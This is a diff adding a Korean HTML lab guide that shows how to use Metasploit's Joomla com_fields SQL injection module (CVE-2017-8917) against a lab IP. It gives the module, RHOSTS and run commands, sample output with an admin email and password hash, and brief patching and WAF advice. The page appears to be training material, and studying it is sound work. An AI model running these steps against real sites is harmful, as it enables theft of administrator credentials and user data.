@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="ko" class="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Metasploit SQLi Master Exploitation Guide</title>
+    <script src="https://cdn.tailwindcss.com?plugins=typography"></script>
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Noto+Sans+KR:wght@300;400;500;700;900&family=Fira+Code:wght@400;500&display=swap');
+        body { 
+            font-family: 'Noto Sans KR', sans-serif; 
+            background-color: #020617; 
+            color: #f8fafc; 
+            margin: 0; padding: 0;
+            line-height: 1.8;
+        }
+        .terminal-bg { background-color: #0c111d; border: 1px solid #1e293b; border-radius: 1rem; }
+        .text-glow { text-shadow: 0 0 15px rgba(34, 211, 238, 0.5); }
+        .section-card { background: rgba(15, 23, 42, 0.8); border: 1px solid rgba(51, 65, 85, 0.4); backdrop-filter: blur(20px); transition: all 0.3s ease; }
+        .section-card:hover { border-color: #3b82f6; }
+        .highlight-line { border-left: 6px solid #3b82f6; padding-left: 2rem; margin-bottom: 3rem; }
+        .step-tag { display: inline-block; background-color: #2563eb; color: #ffffff; padding: 0.25rem 1rem; border-radius: 9999px; font-size: 10px; font-weight: 900; text-transform: uppercase; letter-spacing: 0.1em; margin-bottom: 1rem; }
+        pre { white-space: pre-wrap; word-wrap: break-word; }
+        .success-accent { border-left: 4px solid #22c55e; background: rgba(34, 197, 94, 0.05); }
+    </style>
+</head>
+<body class="antialiased pb-40">
+
+    <!-- Header -->
+    <header class="border-b border-slate-800 bg-slate-900/90 sticky top-0 z-50 backdrop-blur-2xl">
+        <div class="max-w-7xl mx-auto px-10 py-12 flex justify-between items-end">
+            <div>
+                <div class="flex items-center gap-3 mb-6">
+                    <span class="bg-red-600 text-white px-4 py-1 text-[11px] font-black uppercase tracking-[0.4em] rounded-lg shadow-lg shadow-red-900/20">Active Exploitation</span>
+                    <span class="text-slate-500 font-mono text-xs">CVE-2017-8917 | Data Exfiltration Blueprint</span>
+                </div>
+                <h1 class="text-6xl font-black text-white tracking-tighter leading-[1.1]">
+                    Metasploit SQLi Masterclass<br>
+                    <span class="text-blue-400 text-3xl text-glow mt-6 block">줌라(Joomla) 코어 취약점 기반 관리자 데이터 탈취 실습</span>
+                </h1>
+            </div>
+            <div class="text-right hidden xl:block border-l-2 border-slate-800 pl-12">
+                <div class="bg-blue-500/10 text-blue-400 border border-blue-500/30 px-8 py-4 rounded-3xl text-xl font-black font-mono">
+                    SECURITY ARCHITECT
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <main class="max-w-7xl mx-auto px-10 py-24 space-y-56">
+
+        <!-- 1. Attack Context -->
+        <section>
+            <div class="highlight-line">
+                <h2 class="text-4xl font-black text-white tracking-tighter uppercase">
+                    1. 공격 시나리오 분석 (Exploit Scenario Analysis)
+                </h2>
+            </div>
+            <div class="section-card rounded-[3rem] overflow-hidden shadow-2xl">
+                <div class="p-16 space-y-12">
+                    <p class="text-slate-300 text-2xl font-light leading-relaxed">
+                        이번 실습은 줌라(Joomla)의 <strong>com_fields</strong> 구성 요소에서 발생하는 <strong>SQLi (Structured Query Language Injection)</strong>를 타겟팅합니다. 
+                    </p>
+
+                    <div class="bg-slate-900/50 p-10 rounded-3xl border border-slate-800 flex justify-center">
+                        
+                    </div>
+
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-10">
+                        <div class="bg-slate-900/30 p-8 rounded-2xl border border-slate-800">
+                            <h4 class="text-blue-400 font-black text-xs uppercase mb-4">공격의 핵심 (The Core)</h4>
+                            <p class="text-sm text-slate-400">
+                                <strong>CVE-2017-8917</strong>은 줌라 코어의 필터링 미흡을 악용합니다. 특정 URL 매개변수에 악의적인 SQL 구문을 추가하여 데이터베이스의 내용을 에러 메시지나 정상 응답에 포함시켜 탈취합니다.
+                            </p>
+                        </div>
+                        <div class="bg-slate-900/30 p-8 rounded-2xl border border-slate-800">
+                            <h4 class="text-green-400 font-black text-xs uppercase mb-4">탈취 목표 (Objectives)</h4>
+                            <ul class="text-sm text-slate-400 space-y-2">
+                                <li>• 관리자 ID 및 이메일 주소</li>
+                                <li>• 암호화된 비밀번호 해시값</li>
+                                <li>• 전체 회원 명단 및 데이터베이스 구조</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- 2. Procedure -->
+        <section>
+            <div class="highlight-line">
+                <h2 class="text-4xl font-black text-white tracking-tighter uppercase">
+                    2. 단계별 공격 절차 (Step-by-Step Procedure)
+                </h2>
+            </div>
+            <div class="section-card rounded-[3rem] overflow-hidden shadow-2xl">
+                <div class="p-16 space-y-16">
+                    
+                    <div class="space-y-6">
+                        <div class="step-tag">Step 01: Module Selection</div>
+                        <h3 class="text-2xl font-bold text-white">모듈 검색 및 선택</h3>
+                        <p class="text-slate-400 text-sm">최신 메타스플로잇에서 지원하는 줌라 코어 취약점 모듈을 로드합니다.</p>
+                        <div class="terminal-bg p-8 font-mono text-xs leading-loose">
+                            msf6 > <span class="text-yellow-400">search joomla type:auxiliary gather</span><br><br>
+                            &nbsp;0&nbsp;&nbsp;<span class="text-green-400">auxiliary/gather/joomla_com_fields_sqli</span>&nbsp;&nbsp;&nbsp;2017-05-17&nbsp;&nbsp;normal&nbsp;&nbsp;Joomla com_fields SQLi<br><br>
+                            msf6 > <span class="text-yellow-400">use 0</span>
+                        </div>
+                    </div>
+
+                    <div class="space-y-6">
+                        <div class="step-tag">Step 02: Targeting</div>
+                        <h3 class="text-2xl font-bold text-white">타겟 호스트 및 경로 설정</h3>
+                        <p class="text-slate-400 text-sm">공격 대상 서버의 IP와 웹 애플리케이션 경로를 설정합니다.</p>
+                        <div class="terminal-bg p-8 font-mono text-xs leading-loose">
+                            msf6 auxiliary(gather/joomla_com_fields_sqli) > <span class="text-yellow-400">set RHOSTS 192.168.100.7</span><br>
+                            msf6 auxiliary(gather/joomla_com_fields_sqli) > <span class="text-yellow-400">set TARGETURI /joomla/</span><br>
+                            msf6 auxiliary(gather/joomla_com_fields_sqli) > <span class="text-cyan-400">show options</span>
+                        </div>
+                    </div>
+
+                    <div class="space-y-6">
+                        <div class="step-tag">Step 03: Launch</div>
+                        <h3 class="text-2xl font-bold text-white">공격 실행 및 데이터 탈취</h3>
+                        <p class="text-slate-400 text-sm">페이로드를 전송하여 데이터베이스 정보를 추출합니다.</p>
+                        <div class="terminal-bg p-8 font-mono text-xs leading-loose">
+                            msf6 auxiliary(gather/joomla_com_fields_sqli) > <span class="text-red-500 font-black">run</span>
+                        </div>
+                    </div>
+
+                </div>
+            </div>
+        </section>
+
+        <!-- 3. Result Interpretation -->
+        <section>
+            <div class="highlight-line">
+                <h2 class="text-4xl font-black text-white tracking-tighter uppercase">
+                    3. 실습 결과 분석 (Result & Analysis)
+                </h2>
+            </div>
+            <div class="section-card rounded-[3rem] overflow-hidden shadow-2xl">
+                <div class="p-16 space-y-12">
+                    <p class="text-slate-300 text-2xl font-light">
+                        공격 성공 시, 다음과 같이 <strong>관리자 해시(Admin Hash)</strong>가 출력됩니다.
+                    </p>
+
+                    <div class="terminal-bg p-12 space-y-8 border-t-4 border-t-green-500">
+                        <div class="font-mono text-sm leading-loose text-slate-300">
+                            [*] 192.168.100.7:80 - Checking for vulnerability...<br>
+                            <span class="text-green-500 font-bold">[+] 192.168.100.7:80 - Vulnerable! (CVE-2017-8917)</span><br>
+                            [*] 192.168.100.7:80 - Extracting user data...<br><br>
+                            <div class="p-6 bg-slate-950 rounded-2xl border border-slate-900 space-y-2">
+                                <span class="text-white font-bold text-lg">admin (ID: 402)</span><br>
+                                <span class="text-slate-500">Email: admin@test.local</span><br>
+                                <span class="text-cyan-400 font-bold">Password Hash: $2y$10$fWqY8oO9...[생략]</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="success-accent p-8 rounded-2xl">
+                        <h4 class="text-green-400 font-bold mb-2">실습 성공 포인트:</h4>
+                        <p class="text-xs text-slate-400 leading-relaxed">
+                            메타스플로잇은 추출된 해시값을 자동으로 데이터베이스에 저장합니다. 이후 <code>creds</code> 명령어를 통해 확인 가능합니다.
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- 4. Defense -->
+        <section>
+            <div class="highlight-line">
+                <h2 class="text-4xl font-black text-white tracking-tighter uppercase">
+                    4. 방어 전략 (Defense Strategy)
+                </h2>
+            </div>
+            <div class="bg-slate-900/40 border border-slate-800 rounded-[4rem] p-20 shadow-2xl">
+                <div class="grid grid-cols-1 lg:grid-cols-2 gap-20">
+                    <div class="space-y-10">
+                        <div class="text-blue-500"><i data-lucide="shield-check" class="w-20 h-20"></i></div>
+                        <h4 class="font-black text-white text-3xl uppercase italic tracking-tighter">Strategic Hardening</h4>
+                        <div class="space-y-4">
+                            <div class="p-6 bg-slate-800/80 rounded-2xl border border-slate-700">
+                                <strong class="text-blue-400 block mb-2 text-xs uppercase font-black">Zero Trust Patching</strong>
+                                <p class="text-[10px] text-slate-500">Joomla를 3.7.1 이상 최신 버전으로 즉시 업데이트하십시오.</p>
+                            </div>
+                            <div class="p-6 bg-slate-800/80 rounded-2xl border border-slate-700">
+                                <strong class="text-blue-400 block mb-2 text-xs uppercase font-black">WAF Protection</strong>
+                                <p class="text-[10px] text-slate-500">웹 방화벽을 통해 비정상적인 SQL 구문 유입을 차단합니다.</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+    </main>
+
+    <footer class="max-w-7xl mx-auto px-10 py-24 border-t border-slate-800 text-center text-slate-500 font-mono text-[10px] tracking-[0.6em] uppercase">
+        © 2026 IP SECURITY INFRASTRUCTURE ARCHITECT PUBLISHING
+    </footer>
+
+    <script>
+        lucide.createIcons();
+    </script>
+</body>
+</html>
